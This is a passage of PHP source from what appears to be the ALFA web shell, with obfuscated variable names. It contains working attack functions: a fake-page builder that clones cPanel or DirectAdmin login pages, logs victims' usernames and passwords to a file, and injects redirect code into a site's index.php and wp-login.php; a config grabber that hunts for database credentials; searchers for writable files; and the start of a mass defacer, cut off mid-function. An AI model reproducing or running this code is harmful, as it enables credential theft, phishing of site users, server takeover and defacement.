function hijackOutput($yyphbkaj4a8a08f09d37b73795649038408b5f33=0,$fxuvmwpb83878c91171338902e0fe0fb97a8c47a=''){echo($yyphbkaj4a8a08f09d37b73795649038408b5f33==0?"<center><font color='green'>Success</font> --> path: $fxuvmwpb83878c91171338902e0fe0fb97a8c47a</center>":'<center><font color="red">Error in inject code !</font></center>');}
function Alfa_StrSearcher($ofvepnxk736007832d2167baaae763fd3a3f3cf1,$syvgjxtsb45cffe084dd3d20d928bee85e7b0f21,$uzehrcsaabf77184f55403d75b9d51d79162a7ca,$qxcuilgde1671797c52e15f763380b45e841ec32,$dtuckrvi47c80780ab608cc046f2a6e6f071feb6=array()){
if(@is_dir($ofvepnxk736007832d2167baaae763fd3a3f3cf1)){
$blhbqzcb45b963397aa40d4a0063e0d85e4fe7a1=@scandir($ofvepnxk736007832d2167baaae763fd3a3f3cf1);
foreach($blhbqzcb45b963397aa40d4a0063e0d85e4fe7a1 as $ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d => $rkptsoeg2063c1608d6e0baf80249c42e2be5804){
$jwzcflrpd6fe1d0be6347b8ef2427fa629c04485=@realpath($ofvepnxk736007832d2167baaae763fd3a3f3cf1. DIRECTORY_SEPARATOR .$rkptsoeg2063c1608d6e0baf80249c42e2be5804);
if(!@is_dir($jwzcflrpd6fe1d0be6347b8ef2427fa629c04485)){
if($uzehrcsaabf77184f55403d75b9d51d79162a7ca!='*'){$npviloqa8fa14cdd754f91cc6554c9e71929cce7 = basename($jwzcflrpd6fe1d0be6347b8ef2427fa629c04485);$npviloqa8fa14cdd754f91cc6554c9e71929cce7 = explode('.',$npviloqa8fa14cdd754f91cc6554c9e71929cce7);$npviloqa8fa14cdd754f91cc6554c9e71929cce7 = end($npviloqa8fa14cdd754f91cc6554c9e71929cce7);if($npviloqa8fa14cdd754f91cc6554c9e71929cce7!=$uzehrcsaabf77184f55403d75b9d51d79162a7ca)continue;}
if($qxcuilgde1671797c52e15f763380b45e841ec32=='str'){
$mveevork9a0364b9e99bb480dd25e1f0284c8555 = @file_get_contents($jwzcflrpd6fe1d0be6347b8ef2427fa629c04485);
if(strpos($mveevork9a0364b9e99bb480dd25e1f0284c8555, $syvgjxtsb45cffe084dd3d20d928bee85e7b0f21) !== false){
echo str_replace('\\','/',$jwzcflrpd6fe1d0be6347b8ef2427fa629c04485) . "<br>";
}
}else{
if(strstr($rkptsoeg2063c1608d6e0baf80249c42e2be5804,$syvgjxtsb45cffe084dd3d20d928bee85e7b0f21)){
echo str_replace('\\','/',$jwzcflrpd6fe1d0be6347b8ef2427fa629c04485) . "<br>";
}
}
$mkkbxqmk53e61336bb49ec978968786b07dea50b[] = $jwzcflrpd6fe1d0be6347b8ef2427fa629c04485;
}elseif($rkptsoeg2063c1608d6e0baf80249c42e2be5804 != "." && $rkptsoeg2063c1608d6e0baf80249c42e2be5804 != "..") {
Alfa_StrSearcher($jwzcflrpd6fe1d0be6347b8ef2427fa629c04485,$syvgjxtsb45cffe084dd3d20d928bee85e7b0f21,$uzehrcsaabf77184f55403d75b9d51d79162a7ca,$qxcuilgde1671797c52e15f763380b45e841ec32,$mkkbxqmk53e61336bb49ec978968786b07dea50b);
$mkkbxqmk53e61336bb49ec978968786b07dea50b[] = $jwzcflrpd6fe1d0be6347b8ef2427fa629c04485;
}}}}
function alfafakepage(){
	alfahead();
	AlfaNum(9,10);
	echo '<div class=header><br>
	<center><div class="txtfont_header">| Host Manager Fake page |</div></center><br><br><form onSubmit="g(\'fakepage\',null,this.clone_page.value,this.fake_root.value,\'>>\',this.logto.value,this.panel.value,this.inject_to.value,this.bind_on.value,this.count.value);return false;" method=\'post\'>
	<div class="txtfont" style="position: relative;left: 50%;transform: translate(-50%);"><div style="margin-bottom:6px;"><span style="display: inline-block;width: 106px;">Panel: </span><select style="width:100px;" name="panel">';
	$dbaqodsdf0a8d484466c281c1a9087b40aacc270 = array("cpanel"=>"Cpanel","directadmin"=>"DirectAdmin");
	foreach($dbaqodsdf0a8d484466c281c1a9087b40aacc270 as $ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d=>$jjhpbbnw3a6d0284e743dc4a9b86f97d6dd1a3bf)echo '<option value="'.$ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d.'">'.$jjhpbbnw3a6d0284e743dc4a9b86f97d6dd1a3bf.'</option>';
	echo("</select></div>");
	echo '<div style="margin-bottom:6px;"><span style="display: inline-block;width: 106px;">Clone page: </span><input size="50" type="text" name="clone_page" placeholder="eg: https://target.com:2083 | https://target.com:2222"></div>
	<div style="margin-bottom:6px;"><span>Fake page root: </span><input size="50" type="text" name="fake_root" value="'.$_SERVER["DOCUMENT_ROOT"].'/fake_page_root/"></div>
	<div style="margin-bottom:6px;"><span style="display: inline-block;width: 106px;">Inject to: </span><input size="50" type="text" name="inject_to" value="'.$_SERVER["DOCUMENT_ROOT"].'/index.php"></div>
	<div style="margin-bottom:6px;"><span style="display: inline-block;width: 106px;">Bind on: </span><input size="50" type="text" name="bind_on" placeholder="eg: '.$_SERVER["DOCUMENT_ROOT"].'/wp-login.php"></div>
	<div style="margin-bottom:6px;"><span style="display: inline-block;width: 106px;">Log To: </span><input size="50" type="text" name="logto" value="'.$GLOBALS['cwd'].'logs.txt"></div>
	<div style="margin-bottom:6px;"><span style="display: inline-block;width: 106px;">Count of Invalid login: </span><input size="20" type="text" name="count" value="3" style="text-align:center;"></div>
	<div style="text-align:center;"><input type="submit" name="btn" value=" "></div></div></form><br>';
	$cpclacod18a3a63ab9093331c3bbb35d95b48f5a = $_POST['alfa1'];
	$giccknfx44239c782ffe4a36e342c8c3e1326a9a = $_POST['alfa2'];
	$jrmfbbdrb24f0fd76c0472d06da946830bfc42f8 = $_POST['alfa4'];
	$vziqiytnf1e5d7a5fe13498abbdeb0f1f19136a8 = $_POST['alfa5'];
	$rsrdomkl05e5d48c29dbcc9990cbe63e42eee645 = $_POST['alfa6'];
	$zqvfossy2c010a42dd83ed91e18624886208bc40 = $_POST['alfa7'];
	$gstvxiofe2942a04780e223b215eb8b663cf5353 = $_POST['alfa8'];
	if(!empty($cpclacod18a3a63ab9093331c3bbb35d95b48f5a) && !empty($giccknfx44239c782ffe4a36e342c8c3e1326a9a) && !empty($jrmfbbdrb24f0fd76c0472d06da946830bfc42f8) && !empty($rsrdomkl05e5d48c29dbcc9990cbe63e42eee645) && !empty($zqvfossy2c010a42dd83ed91e18624886208bc40) && $_POST['alfa3'] == '>>'){
		echo __pre();
		$nyvfphvm42aefbae01d2dfd981f7da7d823d689e = $cpclacod18a3a63ab9093331c3bbb35d95b48f5a;
		$qqhrnrcwf6e57c9de709e45feb0d955351f53548 = new AlfaCURL();
		$cwcyfsjb789ff4a739b4aad886655656044989ae = $qqhrnrcwf6e57c9de709e45feb0d955351f53548->Send($nyvfphvm42aefbae01d2dfd981f7da7d823d689e);
		if(!empty($cwcyfsjb789ff4a739b4aad886655656044989ae)){
			$arpfcmqm7dc357be275bd318c2bbc4ca17475967 = "";
			if($vziqiytnf1e5d7a5fe13498abbdeb0f1f19136a8 == "cpanel"){
				if(preg_match('#<form(.*)id="login_form"(.*)>#', $cwcyfsjb789ff4a739b4aad886655656044989ae, $ppwzlnqze3cc92c14a5e6dd1a7d94b6ff634d7fc)){
					$arpfcmqm7dc357be275bd318c2bbc4ca17475967 = $ppwzlnqze3cc92c14a5e6dd1a7d94b6ff634d7fc[0];
				}
			}else{
				if(preg_match('#<form(.*?)>#', $cwcyfsjb789ff4a739b4aad886655656044989ae, $ppwzlnqze3cc92c14a5e6dd1a7d94b6ff634d7fc)){
					$arpfcmqm7dc357be275bd318c2bbc4ca17475967 = $ppwzlnqze3cc92c14a5e6dd1a7d94b6ff634d7fc[0];
				}
			}
			if(!empty($arpfcmqm7dc357be275bd318c2bbc4ca17475967)){
				$qnhavdjg144c9defac04969c7bfad8efaa8ea194 = "";
				$mevhntrj9003d1df22eb4d3820015070385194c8 = str_replace($_SERVER["DOCUMENT_ROOT"], '', $giccknfx44239c782ffe4a36e342c8c3e1326a9a);
				$wtsjcykq9305b73d359bd06734fee0b3638079e1 = str_replace($_SERVER["DOCUMENT_ROOT"], '', $rsrdomkl05e5d48c29dbcc9990cbe63e42eee645);
				if($vziqiytnf1e5d7a5fe13498abbdeb0f1f19136a8 == "cpanel"){
					$fbwqabyz901555fb06e346cb065ceb9808dcfc25 = "2083";
				}else{
					$nyvfphvm42aefbae01d2dfd981f7da7d823d689e = str_replace(array("http://", "https://"), "", $nyvfphvm42aefbae01d2dfd981f7da7d823d689e);
					$fbwqabyz901555fb06e346cb065ceb9808dcfc25 = explode(":",$nyvfphvm42aefbae01d2dfd981f7da7d823d689e);
					$fbwqabyz901555fb06e346cb065ceb9808dcfc25 = $fbwqabyz901555fb06e346cb065ceb9808dcfc25[1];
				}
				if(substr($wtsjcykq9305b73d359bd06734fee0b3638079e1, 0, 1) == "/"){
					$wtsjcykq9305b73d359bd06734fee0b3638079e1 = substr($wtsjcykq9305b73d359bd06734fee0b3638079e1, 1);
				}
				$wtsjcykq9305b73d359bd06734fee0b3638079e1 = $_SERVER["HTTP_ORIGIN"] . '/' . str_replace("index.php", "", $wtsjcykq9305b73d359bd06734fee0b3638079e1) . '?:' . $fbwqabyz901555fb06e346cb065ceb9808dcfc25;
				$lbvowlpz2801df5ede9768e23fa6086d28f6da48 = $_SERVER["HTTP_ORIGIN"] . $mevhntrj9003d1df22eb4d3820015070385194c8 . '/log.php';
				if($vziqiytnf1e5d7a5fe13498abbdeb0f1f19136a8 == "cpanel"){
					$zuviobxn3fcdb73d36d54f2cc22d0f68e6b6e182 = '<form novalidate id="login_form" action="'.$lbvowlpz2801df5ede9768e23fa6086d28f6da48.'" method="post" target="_top" style="visibility:">';
				}else{
					$zuviobxn3fcdb73d36d54f2cc22d0f68e6b6e182 = '<form action="'.$lbvowlpz2801df5ede9768e23fa6086d28f6da48.'" method="post">';
				}
				$qnhavdjg144c9defac04969c7bfad8efaa8ea194 = str_replace($arpfcmqm7dc357be275bd318c2bbc4ca17475967, $zuviobxn3fcdb73d36d54f2cc22d0f68e6b6e182, $cwcyfsjb789ff4a739b4aad886655656044989ae);
				if(@!is_dir($giccknfx44239c782ffe4a36e342c8c3e1326a9a)){
					@mkdir($giccknfx44239c782ffe4a36e342c8c3e1326a9a, 0777, true);
				}

				$pngomgwqe3cb9741ffde596f46710a5d7e3ec587 = "alfa_fakepage_counter" . rand(9999,99999);

				$cskdgglw505be881b902b25238ba9023d9880598 = 'user';
				$yvivjrhz19147c5b9c1af3d2df41c251d9a4afa9 = 'pass';
				$ubekkrtm61749cce4755c9861e76d96d933b2f7a = 'if(empty($user)){http_response_code(400);echo json_encode(array("message" => "no_username"));}else{http_response_code(401);}';
				if($vziqiytnf1e5d7a5fe13498abbdeb0f1f19136a8 != "cpanel"){
					$cskdgglw505be881b902b25238ba9023d9880598 = 'username';
					$yvivjrhz19147c5b9c1af3d2df41c251d9a4afa9 = 'password';
					$ubekkrtm61749cce4755c9861e76d96d933b2f7a = '@header("Location: ".$_SERVER[\'HTTP_REFERER\']);';
				}

				$zwnpfvwzef6ccbdea09f606dcae5b309fff3aa9b = '<?php $cook_time = time()+(86400 * 7); $user = $_POST["'.$cskdgglw505be881b902b25238ba9023d9880598.'"];$pass = $_POST["'.$yvivjrhz19147c5b9c1af3d2df41c251d9a4afa9.'"];if(!empty($user) && !empty($pass)){if(!isset($_COOKIE["'.$pngomgwqe3cb9741ffde596f46710a5d7e3ec587.'"])){@setcookie("'.$pngomgwqe3cb9741ffde596f46710a5d7e3ec587.'", 0, $cook_time, "/");$_COOKIE["'.$pngomgwqe3cb9741ffde596f46710a5d7e3ec587.'"]=1;}if((int)$_COOKIE["'.$pngomgwqe3cb9741ffde596f46710a5d7e3ec587.'"]>'.$gstvxiofe2942a04780e223b215eb8b663cf5353.'){@header("Location: /");exit;}@setcookie("'.$pngomgwqe3cb9741ffde596f46710a5d7e3ec587.'", ((int)$_COOKIE["'.$pngomgwqe3cb9741ffde596f46710a5d7e3ec587.'"] + 1), $cook_time, "/");$fp = @fopen("'.$jrmfbbdrb24f0fd76c0472d06da946830bfc42f8.'", "a+");@fwrite($fp, $user . " : " . $pass . "\n");fclose($fp);sleep(3);'.$ubekkrtm61749cce4755c9861e76d96d933b2f7a.'exit;}?>';

				@file_put_contents($giccknfx44239c782ffe4a36e342c8c3e1326a9a.'/log.php', $zwnpfvwzef6ccbdea09f606dcae5b309fff3aa9b);

				if($vziqiytnf1e5d7a5fe13498abbdeb0f1f19136a8 == "cpanel"){
					$qnhavdjg144c9defac04969c7bfad8efaa8ea194 = preg_replace(array('#<link(.*)href="(.*)"(.*)>#', '#<img class="main-logo" src="(.*)"(.*)>#', '# <a(.*)id="reset_password">#'), array('<link href="'.$nyvfphvm42aefbae01d2dfd981f7da7d823d689e.'/$2">', '<img class="main-logo" src="'.$nyvfphvm42aefbae01d2dfd981f7da7d823d689e.'/$1" alt="logo" />', '<a href="#" id="reset_password">'), $qnhavdjg144c9defac04969c7bfad8efaa8ea194);
				}

				@file_put_contents($giccknfx44239c782ffe4a36e342c8c3e1326a9a.'/index.php', $qnhavdjg144c9defac04969c7bfad8efaa8ea194);

				$cdyrsnui7ef52bf2c386fc29fd62d36b604aac39 = '<?php if(isset($_GET[":2083"])&&(int)$_COOKIE["'.$pngomgwqe3cb9741ffde596f46710a5d7e3ec587.'"]<'.$gstvxiofe2942a04780e223b215eb8b663cf5353.'){@include("'.$giccknfx44239c782ffe4a36e342c8c3e1326a9a.'/index.php");exit;}?>';
				$tdfrmmae425c4ba0986b77c882762bfe683f57d0 = '<?php if((int)$_COOKIE["'.$pngomgwqe3cb9741ffde596f46710a5d7e3ec587.'"]<'.$gstvxiofe2942a04780e223b215eb8b663cf5353.'){@header("Location: '.$wtsjcykq9305b73d359bd06734fee0b3638079e1.'");exit;}?>';

				@file_put_contents($rsrdomkl05e5d48c29dbcc9990cbe63e42eee645, $cdyrsnui7ef52bf2c386fc29fd62d36b604aac39 . "\n" .@file_get_contents($rsrdomkl05e5d48c29dbcc9990cbe63e42eee645));
				@file_put_contents($zqvfossy2c010a42dd83ed91e18624886208bc40, $tdfrmmae425c4ba0986b77c882762bfe683f57d0 . "\n" .@file_get_contents($zqvfossy2c010a42dd83ed91e18624886208bc40));

				echo "success...!";
			}else{
				echo "failed...!";
			}
		}else{
			echo("<div style='text-align:center;color:red;'>Cannot open the target...!</div>");
		}
	}
	echo '</div>';
	alfafooter();
}
function alfaarchive_manager(){
	alfahead();
	$wdyhqgwg8c7dd922ad47494fc02c388e12c00eac = $_POST['alfa2'];
	if(!file_exists($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac)){
		$wdyhqgwg8c7dd922ad47494fc02c388e12c00eac = $GLOBALS['cwd'];
	}
	$acfybpuy0d8f750cfdf0ab22480f17fcd46aca1d = rand(9999, 999999);
	echo '<div class=header><center><p><div class="txtfont_header">| Archive Manager |</div></p>';
	echo '<form name="srch" onSubmit="g(\'archive_manager\',null,null,this.file.value,null,null,\'>>\');return false;" method=\'post\'>
	<div class="txtfont">
	Archive file: <input size="50" id="target" type="text" name="file" value="'.$wdyhqgwg8c7dd922ad47494fc02c388e12c00eac.'">
	<input type="submit" name="btn" value=" "></div></form></center><br>';
	if($_POST['alfa5']=='>>'){
		//echo __pre();
		echo '<hr><div style="margin-left: 12px;" archive_full="phar://'.$wdyhqgwg8c7dd922ad47494fc02c388e12c00eac.'" archive_name="'.basename($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac).'" id="archive_dir_'.$acfybpuy0d8f750cfdf0ab22480f17fcd46aca1d.'" class="archive_dir_holder"><span>PWD: </span><div class="archive_pwd_holder" style="display:inline-block"><a>/</a></div></div>';
		echo '<div style="padding: 10px;" id="archive_base_'.$acfybpuy0d8f750cfdf0ab22480f17fcd46aca1d.'">';
		__alfa_open_archive_file($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac, $acfybpuy0d8f750cfdf0ab22480f17fcd46aca1d);
		echo '</div>';
	}echo '</div>';
	alfafooter();
}
function __alfa_open_archive_file($wveevzovd6194c68fcc7e79bb57401be603cb1cc, $ssyvjzcs078dce83ff235666e1056fac71d9e5a5=0){
	try{
		$blhbqzcb45b963397aa40d4a0063e0d85e4fe7a1 = array();
		$rgfoludk33030abc929f083da5f6c3f755b46034 = array();
		$qcbwnvqx888d0ee361af3603736f32131e7b20a2 = new PharData($wveevzovd6194c68fcc7e79bb57401be603cb1cc);
		 foreach($qcbwnvqx888d0ee361af3603736f32131e7b20a2 as $wdyhqgwg8c7dd922ad47494fc02c388e12c00eac) {
			 $kaetjeum0accdd691149b8182212528c8ed7330c = @date('Y-m-d H:i:s', @filemtime($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac->getPathname()));
		     if($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac->isDir()) {
				 $rgfoludk33030abc929f083da5f6c3f755b46034[] = array("name" => $wdyhqgwg8c7dd922ad47494fc02c388e12c00eac->getFileName(), "path" => $wdyhqgwg8c7dd922ad47494fc02c388e12c00eac->getPathname(), "type" => "dir", "modify" => $kaetjeum0accdd691149b8182212528c8ed7330c);
		     }else{
				 $noybsmul234ef73792399c22704f8aef10b14541 = @filesize($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac->getPathname());
				 $blhbqzcb45b963397aa40d4a0063e0d85e4fe7a1[] = array("name" => $wdyhqgwg8c7dd922ad47494fc02c388e12c00eac->getFileName(), "path" => $wdyhqgwg8c7dd922ad47494fc02c388e12c00eac->getPathname(), "type" => "file",  "modify" => $kaetjeum0accdd691149b8182212528c8ed7330c, "size" => $noybsmul234ef73792399c22704f8aef10b14541);
			 }
		 }
		 function __alfa_open_archive_usort($gtvtgpki0cc175b9c0f1b6a831c399e269772661, $aospafqz92eb5ffee6ae2fec3ad71c777531578f){
			 return strcmp(strtolower($gtvtgpki0cc175b9c0f1b6a831c399e269772661['name']), strtolower($aospafqz92eb5ffee6ae2fec3ad71c777531578f['name']))*1;
		 }
		 usort($rgfoludk33030abc929f083da5f6c3f755b46034, "__alfa_open_archive_usort");
		 usort($blhbqzcb45b963397aa40d4a0063e0d85e4fe7a1, "__alfa_open_archive_usort");
		 $blhbqzcb45b963397aa40d4a0063e0d85e4fe7a1 = array_merge($rgfoludk33030abc929f083da5f6c3f755b46034, $blhbqzcb45b963397aa40d4a0063e0d85e4fe7a1);
		 echo '<table width="100%" class="main" cellspacing="0" cellpadding="2"><tbody><tr><th>Name</th><th>Size</th><th>Modify</th><th>Actions</th></tr>';
		 $pzbnrxfobaec6461b0d69dde1b861aefbe375d8a = '<img class="archive-icons" src="'.findicon('..','dir').'" width="30" height="30">';
		 echo '<tr><th><a base_id="'.$ssyvjzcs078dce83ff235666e1056fac71d9e5a5.'" class="archive-file-row" fname=".." onclick="alfaOpenArchive(this);" path="'.dirname($wveevzovd6194c68fcc7e79bb57401be603cb1cc.'.php').'">'.$pzbnrxfobaec6461b0d69dde1b861aefbe375d8a.'<span class="archive-name archive-type-dir">| .. |</span></a><td>dir</td><td>-</td><td>-</td></tr>';
		 foreach($blhbqzcb45b963397aa40d4a0063e0d85e4fe7a1 as $wdyhqgwg8c7dd922ad47494fc02c388e12c00eac){
			 $pzbnrxfobaec6461b0d69dde1b861aefbe375d8a = '<img class="archive-icons" src="'.findicon($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac['name'],$wdyhqgwg8c7dd922ad47494fc02c388e12c00eac['type']).'" width="30" height="30">';
			 if($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac["type"] == "dir"){
			 	echo '<tr><th><a base_id="'.$ssyvjzcs078dce83ff235666e1056fac71d9e5a5.'" class="archive-file-row" onclick="alfaOpenArchive(this);" path="'.$wdyhqgwg8c7dd922ad47494fc02c388e12c00eac["path"].'" fname="'.$wdyhqgwg8c7dd922ad47494fc02c388e12c00eac["name"].'">'.$pzbnrxfobaec6461b0d69dde1b861aefbe375d8a.'<span class="archive-name archive-type-dir">| '.$wdyhqgwg8c7dd922ad47494fc02c388e12c00eac["name"].' |</span></a><td>dir</td><td>'.$wdyhqgwg8c7dd922ad47494fc02c388e12c00eac["modify"].'</td><td>-</td></tr>';
		 	}else{
				echo "<tr><th><a base_id='".$ssyvjzcs078dce83ff235666e1056fac71d9e5a5."' class='archive-file-row' onclick=\"editor('".$wdyhqgwg8c7dd922ad47494fc02c388e12c00eac["path"]."','auto','','','','file');\">".$pzbnrxfobaec6461b0d69dde1b861aefbe375d8a."<span class='archive-name archive-type-file' fname='".$wdyhqgwg8c7dd922ad47494fc02c388e12c00eac["name"]."'>".$wdyhqgwg8c7dd922ad47494fc02c388e12c00eac["name"]."</span></a><td>".alfaSize($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac["size"])."</td><td>".$wdyhqgwg8c7dd922ad47494fc02c388e12c00eac["modify"]."</td><td>-</td></tr>";

			}
		 }
		  echo '</table>';
	}catch(Exception $qxcuilgde1671797c52e15f763380b45e841ec32){
		echo("0");
	}
}
function alfaopen_archive_dir(){
	$ofvepnxk736007832d2167baaae763fd3a3f3cf1 = $_POST["alfa1"];
	$ssyvjzcs078dce83ff235666e1056fac71d9e5a5 = $_POST["alfa2"];
	__alfa_open_archive_file($ofvepnxk736007832d2167baaae763fd3a3f3cf1, $ssyvjzcs078dce83ff235666e1056fac71d9e5a5);
}
function alfaconfig_grabber(){
	alfahead();
	echo '<div class=header><center><p><div class="txtfont_header">| Config Grabber |</div></p>';
	echo '<form name="srch" onSubmit="g(\'config_grabber\',null,null,this.dir.value,this.ext.value,null,\'>>\');return false;" method=\'post\'>
	<div class="txtfont">
	Dir: <input size="50" id="target" type="text" name="dir" value="'.$GLOBALS['cwd'].'">
	Ext: <small><font color="red">[ * = all Ext ]</font></small> <input id="ext" style="text-align:center;" type="text" name="ext" size="5" value="php">
	<input type="submit" name="btn" value=" "></div></form></center><br>';
	$ofvepnxk736007832d2167baaae763fd3a3f3cf1 = $_POST['alfa2'];
	$uzehrcsaabf77184f55403d75b9d51d79162a7ca = $_POST['alfa3'];
	if($_POST['alfa5']=='>>'){
		echo __pre();
		Alfa_ConfigGrabber($ofvepnxk736007832d2167baaae763fd3a3f3cf1, $uzehrcsaabf77184f55403d75b9d51d79162a7ca);
	}
	echo '</div>';
	alfafooter();
}
function Alfa_ConfigGrabber($ofvepnxk736007832d2167baaae763fd3a3f3cf1, $uzehrcsaabf77184f55403d75b9d51d79162a7ca) {
	$mztmcsjn240bf022e685b0ee30ad9fe9e1fb5d5b = "#define[ ]{0,}\([ ]{0,}(?:'|\")DB_HOST(?:'|\")[ ]{0,}|define[ ]{0,}\([ ]{0,}(?:'|\")DB_HOSTNAME(?:'|\")[ ]{0,}|config\[(?:'|\")MasterServer(?:'|\")\]\[(?:'|\")password(?:'|\")\]|(?:'|\")database(?:'|\")[ ]{0,}=>[ ]{0,}(?:'|\")(.*?)(?:'|\")|(?:'|\")(mysql|database)(?:'|\")[ ]{0,}=>[ ]{0,}array|db_name|db_user|db_pass|db_server|db_host|dbhost|dbname|dbuser|dbpass|database_name|database_user|database_pass|mysql_user|mysql_pass|mysqli_connect|mysql_connect|new[ ]{0,}mysqli#i";
	$pxkqzxoce482c58edd82e04dcbd868fdb186dca5 = array("wp-config.php","configure.php","config.inc.php","configuration.php","config.php","conf.php","dbclass.php","class_core.php","dist-configure.php", "settings.php", "conf_global.php", "db.php", "connect.php", "confing.db.php", "config.db.php", "database.php");
	if(@is_readable($ofvepnxk736007832d2167baaae763fd3a3f3cf1)){
		$ghevmcuze3c14af3892a4ccb759e0e4974df197c = @glob("$ofvepnxk736007832d2167baaae763fd3a3f3cf1/*.$uzehrcsaabf77184f55403d75b9d51d79162a7ca");
		$ijcmoisj6fb69e88996e72e8fc50e13f205ca4fd  = @glob("$ofvepnxk736007832d2167baaae763fd3a3f3cf1/*", GLOB_ONLYDIR);
		$vefebpqna0bc9791616492b14e330a7e0ef35512 = array();
		foreach ($ijcmoisj6fb69e88996e72e8fc50e13f205ca4fd as $ofvepnxk736007832d2167baaae763fd3a3f3cf1) {
			if(!@is_readable($ofvepnxk736007832d2167baaae763fd3a3f3cf1)||@is_link($ofvepnxk736007832d2167baaae763fd3a3f3cf1)) continue;
			@Alfa_ConfigGrabber($ofvepnxk736007832d2167baaae763fd3a3f3cf1, $uzehrcsaabf77184f55403d75b9d51d79162a7ca);
		}
		foreach ($ghevmcuze3c14af3892a4ccb759e0e4974df197c as $wdyhqgwg8c7dd922ad47494fc02c388e12c00eac){
			$zprekamg6e07db9a904e1b56ecd015d140691d13 = @file_get_contents($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac);
			if(preg_match($mztmcsjn240bf022e685b0ee30ad9fe9e1fb5d5b, $zprekamg6e07db9a904e1b56ecd015d140691d13)){
				echo "<div><span>$wdyhqgwg8c7dd922ad47494fc02c388e12c00eac</span> <a style='cursor:pointer;' onclick=\"editor('".$wdyhqgwg8c7dd922ad47494fc02c388e12c00eac."','auto','','','','file');\">[ View file ]</a></div>";
			}
		}
	}
}
function alfasearcher(){
alfahead();
echo '<div class=header><center><p><div class="txtfont_header">| Searcher |</div></p><h3><a href=javascript:void(0) onclick="g(\'searcher\',null,\'file\')">| Find Readable Or Writable Files | </a><a href=javascript:void(0) onclick="g(\'searcher\',null,\'str\')">| Find Files By Name | </a></h3></center>';
if(isset($_POST['alfa1'])&&$_POST['alfa1']=='file'){
echo '<center><div class="txtfont_header">| Find Readable Or Writable Files  |</div><br><br><form name="srch" onSubmit="g(\'searcher\',null,\'file\',this.filename.value,this.ext.value,this.method.value,\'>>\');return false;" method=\'post\'>
<div class="txtfont">
Method: <select style="width: 18%;" onclick="alfa_searcher_tool(this.value);" name="method"><option value="files">Find All Writable Files</option><option value="dirs">Find All Writable Dirs</option><option value="all">Find All Readable And Writable Files</option></select>
Dir: <input size="50" id="target" type="text" name="filename" value="'.$GLOBALS['cwd'].'">
Ext: <small><font color="red">[ * = all Ext ]</font></small> <input id="ext" style="text-align:center;" type="text" name="ext" size="5" value="php">
<input type="submit" name="btn" value=" "></div></form></center><br>';
$ofvepnxk736007832d2167baaae763fd3a3f3cf1 = $_POST['alfa2'];
$uzehrcsaabf77184f55403d75b9d51d79162a7ca = $_POST['alfa3'];
$qmqhsytzea9f6aca279138c58f705c8d4cb4b8ce = $_POST['alfa4'];
if($_POST['alfa5']=='>>'){
echo __pre();
if(substr($ofvepnxk736007832d2167baaae763fd3a3f3cf1,-1)=='/')$ofvepnxk736007832d2167baaae763fd3a3f3cf1=substr($ofvepnxk736007832d2167baaae763fd3a3f3cf1,0,-1);
Alfa_Searcher($ofvepnxk736007832d2167baaae763fd3a3f3cf1,trim($uzehrcsaabf77184f55403d75b9d51d79162a7ca),$qmqhsytzea9f6aca279138c58f705c8d4cb4b8ce);
}
}
if($_POST['alfa1']=='str'){
echo '<center><div class="txtfont_header">| Find Files By Name / Find String In Files |</div><br><br><form onSubmit="g(\'searcher\',null,\'str\',this.dir.value,this.string.value,\'>>\',this.ext.value,this.method.value);return false;" method=\'post\'>
<div class="txtfont">
Method: <select name="method"><option value="name">Find Files By Name</option><option value="str">Find String In Files</option></select>
String: <input type="text" name="string" value="">
Dir: <input size="50" type="text" name="dir" value="'.$GLOBALS['cwd'].'">
Ext: <small><font color="red">[ * = all Ext ]</font></small> <input id="ext" style="text-align:center;" type="text" name="ext" size="5" value="php">
<input type="submit" name="btn" value=" "></div></form></center><br>';
$ofvepnxk736007832d2167baaae763fd3a3f3cf1 = $_POST['alfa2'];
$syvgjxtsb45cffe084dd3d20d928bee85e7b0f21 = $_POST['alfa3'];
$uzehrcsaabf77184f55403d75b9d51d79162a7ca = $_POST['alfa5'];
if(!empty($syvgjxtsb45cffe084dd3d20d928bee85e7b0f21) AND !empty($ofvepnxk736007832d2167baaae763fd3a3f3cf1) AND $_POST['alfa4'] == '>>'){
echo __pre();
Alfa_StrSearcher($ofvepnxk736007832d2167baaae763fd3a3f3cf1,$syvgjxtsb45cffe084dd3d20d928bee85e7b0f21,$uzehrcsaabf77184f55403d75b9d51d79162a7ca,$_POST['alfa6']);
}
}
echo '</div>';
alfafooter();
}
function alfaMassDefacer(){
alfahead();
AlfaNum(5,6,7,8,9,10);
echo "<div class=header><center><p><div class='txtfont_header'>| Mass Defacer |</div></p><form onSubmit=\"g('MassDefacer',null,this.massdir.value,this.defpage.value,this.method.value,'>>');return false;\" method='post'>";
echo '<div class="txtfont">Deface Method: <select name="method"><option value="index">Deface Index Dirs</option><option value="all">All Files</option></select>
	Mass dir: <input size="50" id="target" type="text" name="massdir" value="'.htmlspecialchars($GLOBALS['cwd']).'">
	DefPage: <input size="50" type="text" name="defpage" value="'.htmlspecialchars($GLOBALS['cwd']).'"></div> <input type="submit" name="btn" value=" "></center></p>
</form>';
$ofvepnxk736007832d2167baaae763fd3a3f3cf1 = $_POST['alfa1'];
$halrheeadb3b348bb48b63e468cf5a6355bd379a = $_POST['alfa2'];
$qmqhsytzea9f6aca279138c58f705c8d4cb4b8ce = $_POST['alfa3'];
$ftqxgdqada12455c4a8ca8fc5d88a2b95fae6b8c = $GLOBALS['__file_path'];
if($_POST['alfa4'] == '>>'){
if(!empty($ofvepnxk736007832d2167baaae763fd3a3f3cf1)){
if(@is_dir($ofvepnxk736007832d2167baaae763fd3a3f3cf1)){
if(@is_readable($ofvepnxk736007832d2167baaae763fd3a3f3cf1)){
if(@is_file($halrheeadb3b348bb48b63e468cf5a6355bd379a)){
if($qwysgjpm700f6fa0edb608ee5cc3cfa63f1c94cc = @opendir($ofvepnxk736007832d2167baaae763fd3a3f3cf1)){
echo __pre();
